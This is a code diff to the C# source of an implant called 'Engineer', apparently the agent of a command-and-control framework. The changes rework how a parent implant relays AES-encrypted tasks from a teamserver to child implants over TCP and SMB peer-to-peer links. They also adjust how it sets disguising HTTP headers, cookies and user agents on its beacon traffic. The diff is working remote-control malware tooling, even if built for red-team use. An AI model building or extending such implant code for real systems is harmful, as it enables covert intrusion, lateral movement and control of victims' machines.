@@ -33,7 +33,7 @@ namespace Engineer.Models
 
 		public static Dictionary<string, string> ChildEngineers { get; set; } = new Dictionary<string, string>();
 
-        private CancellationTokenSource _tokenSource;
+		private CancellationTokenSource _tokenSource = new CancellationTokenSource();
 		protected internal HttpClient _client;
         protected internal HttpClientHandler _handler;
 
@@ -97,6 +97,7 @@ namespace Engineer.Models
 				{
                     if(taskMessage.PathMessage.Count() == 1 )
 					{
+						Console.WriteLine($"Using {Program.UniqueTaskKey} to decrypt task");
                         var decTask = Encryption.AES_Decrypt(taskMessage.TaskData,Program.UniqueTaskKey);
                         HandleResponse(decTask);
                     }
@@ -173,26 +174,56 @@ namespace Engineer.Models
                Console.WriteLine(e.Message);
             }
 		}
+		
+		//used by the http parent to send data for child engineers to the teamserver
 		public async Task Postp2pData()
 		{
             try
             {
                 string url = Urls[new Random().Next(Urls.Count)];
-                byte[] Encryptedoutbound = GetP2POutbound(); //already has the encryption and seralization 
+                List<byte[]> Encryptedoutbound = GetP2POutbound(); //already has the encryption and seralization 
                 //turn the encrypted byte array into HttpContent
-                var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
+                //join all the items in the list into one byte array
+                var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound.SelectMany(x => x).ToArray());
+                //var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
                 
                 var response = await _client.PostAsync(url, EncryptedoutboundContent);
-                Console.WriteLine($"{DateTime.Now} posting P2P Task Response");
+                Console.WriteLine($"{DateTime.UtcNow} posting P2P Task Response, size {EncryptedoutboundContent.Headers.ContentLength} bytes");
 				var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                 if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
                 {
                     //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                     var decMessage = Encryption.AES_Decrypt(EncresponseContent,Program.MessagePathKey);
-                    var encTask = decMessage.ProDeserialize<C2TaskMessage>();
+                    var C2MessageList = decMessage.ProDeserialize<List<C2TaskMessage>>();
                     //Console.WriteLine("C2TaskMessage deserialized");
-                    var decTask = Encryption.AES_Decrypt(encTask.TaskData,Program.UniqueTaskKey);
-                    HandleResponse(decTask);
+                    foreach (C2TaskMessage taskMessage in C2MessageList)
+                    {
+	                    //if pathing count is 1 then it is for this engineer
+	                    if (taskMessage.PathMessage.Count() == 1)
+	                    {
+		                    var decTask = Encryption.AES_Decrypt(taskMessage.TaskData, Program.UniqueTaskKey);
+		                    HandleResponse(decTask);
+	                    }
+	                    // if pathing is higher then 1 then it is for a child engineer
+	                    else
+	                    {
+		                    //read the path and see if it is a child engineer and forward it on.
+		                    taskMessage.PathMessage.RemoveAt(0);
+		                    string dest = taskMessage.PathMessage[0];
+		                    Console.WriteLine($"{DateTime.UtcNow} got task for child {dest}");
+		                    var serializedTaskMessage = taskMessage.ProSerialise();
+		                    var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
+		                    if (EngTCPComm.ParentToChildData.Count > 0)
+		                    {
+			                    EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+		                    }
+		                    else if (EngSMBComm.ParentToChildData.Count > 0)
+		                    {
+			                    EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+		                    }
+	                    }
+
+                    }
                 }
             }
             catch (Exception e)
@@ -275,11 +306,11 @@ namespace Engineer.Models
             {
 				_client.BaseAddress = new Uri("http://" + ConnectAddress + ":" + ConnectPort);
             }
-            Console.WriteLine($"metadata encryption key is {Program.MetadataKey}");
+            //Console.WriteLine($"metadata encryption key is {Program.MetadataKey}");
 			var encodedMetadata = Convert.ToBase64String(Encryption.AES_Encrypt(engineerMetadata.ProSerialise(),Program.MetadataKey)); // returns a base64 encoded string of AES encvrypted serilized json data
 			_client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
-            string EncryptedMetadataID = Convert.ToBase64String(Encryption.AES_Encrypt(Encoding.UTF8.GetBytes(engineerMetadata.Id), Program.MetadataIDKey));
-            _client.DefaultRequestHeaders.Add("Authentication",$"{EncryptedMetadataID}");
+            /*string EncryptedMetadataID = Convert.ToBase64String(Encryption.AES_Encrypt(Encoding.UTF8.GetBytes(engineerMetadata.Id), Program.MetadataKey));
+            _client.DefaultRequestHeaders.Add("Authentication",$"{EncryptedMetadataID}");*/
             foreach(string header in RequestHeaders)
             {
                 //split the header string at the first index of VALUE so the name is everything to the left of the VALUE and the value is everything to the right of the VALUE
@@ -288,8 +319,9 @@ namespace Engineer.Models
 
                 _client.DefaultRequestHeaders.Add($"{headerName}", $"{headerValue}");
             }
+            _client.DefaultRequestHeaders.Add("Cookie",Cookies);
             _client.DefaultRequestHeaders.UserAgent.ParseAdd(UserAgent);
-
+            
 
 
         }
